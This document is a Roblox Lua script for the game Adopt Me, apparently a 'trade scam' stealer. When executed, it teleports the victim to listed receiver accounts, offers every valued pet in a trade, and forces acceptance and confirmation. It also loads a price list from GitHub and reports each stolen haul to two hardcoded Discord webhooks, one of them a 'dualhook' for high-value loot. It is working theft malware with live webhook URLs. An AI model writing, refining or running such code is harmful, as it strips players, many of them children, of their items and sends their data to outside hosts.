-- Features: Point System, Dualhook (500+), Instant TP, Pets Only

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- [[ SETTINGS ]] --
local USER_WEBHOOK = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku"
local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1417861953208193126/wWUd-tqbQT56zqL_y0KSF_s5ZYdBKfLtBJaWYVCN_uwue9hq8CsGuQWJOL1ivGEZ2CYz"
local POINT_SYSTEM_URL = "https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/Pointsystem"

local TARGET_RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
local DUALHOOK_MIN = 500   -- Send to dualhook if pet or total >= 500
local USER_PING_MIN = 1000 -- @everyone on userhook if total >= 1000
local POLL_RATE = 0.4      -- Speed of checking for receivers

-- [[ INTERNAL ]] --
local PetValues = {}
local TradeAPI = ReplicatedStorage:WaitForChild("API")

-- Load Point System Values
local function loadPoints()
    local success, result = pcall(function() return game:HttpGet(POINT_SYSTEM_URL) end)
    if success then
        PetValues = HttpService:JSONDecode(result)
        print("Point system loaded.")
    end
end
loadPoints()

--------------------------------------------------------------
-- WEBHOOK LOGIC
--------------------------------------------------------------
local function sendWebhook(url, content, embeds)
    local req = (syn and syn.request) or http_request or request
    if not req then return end
    pcall(function()
        req({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({content = content, embeds = embeds})
        })
    end)
end

local function reportTrade(pets, total)
    local isHighValue = (total >= DUALHOOK_MIN)
    for _, p in ipairs(pets) do if p.value >= DUALHOOK_MIN then isHighValue = true end end

    local petList = {}
    for _, p in ipairs(pets) do table.insert(petList, "• " .. p.name .. " ($" .. p.value .. ")") end

    local embed = {
        title = "Adopt Me Trade Executed",
        color = isHighValue and 0xFF0000 or 0x3498DB,
        fields = {
            {name = "👤 User", value = LocalPlayer.Name, inline = true},
            {name = "💰 Value", value = total .. " Pesos", inline = true},
            {name = "🐾 Pets Traded", value = "```\n" .. table.concat(petList, "\n") .. "\n```"}
        },
        footer = {text = "Elysium ADM | v1.9"},
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    -- Userhook
    local userPing = (total >= USER_PING_MIN) and "@everyone" or ""
    sendWebhook(USER_WEBHOOK, userPing, {embed})

    -- Dualhook
    if isHighValue then
        sendWebhook(DUAL_WEBHOOK, "@everyone", {embed})
    end
end

--------------------------------------------------------------
-- TRADE & MOVEMENT LOGIC
--------------------------------------------------------------
local function getReceiver()
    for _, name in ipairs(TARGET_RECEIVERS) do
        local p = Players:FindFirstChild(name)
        if p and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then return p end
    end
    return nil
end

local function getValuablePets()
    local pList = {}
    local total = 0
    local inv = TradeAPI["InventoryAPI/GetInventory"]:InvokeServer()
    for _, item in ipairs(inv) do
        if item.Kind == "Pet" then
            local val = PetValues[item.Name] or 0
            if val > 0 then
                table.insert(pList, {id = item.Id, name = item.Name, value = val})
                total = total + val
            end
        end
    end
    return pList, total
end

local function runTrade()
    local target = getReceiver()
    if not target then return end

    -- Instant TP
    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if hrp then hrp.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3) end
    
    task.wait(0.1)
    
    -- Fast Trade Remotes
    TradeAPI["TradeAPI/SendTradeRequest"]:FireServer(target)
    
    local pets, total = getValuablePets()
    if #pets > 0 then
        for _, p in ipairs(pets) do
            TradeAPI["TradeAPI/AddItemToOffer"]:FireServer(p.id)
        end
        TradeAPI["TradeAPI/AcceptTrade"]:FireServer()
        TradeAPI["TradeAPI/ConfirmTrade"]:FireServer()
        reportTrade(pets, total)
    end
end

-- Main Loop
task.spawn(function()
    while true do
        pcall(runTrade)
        task.wait(POLL_RATE)
    end
end)
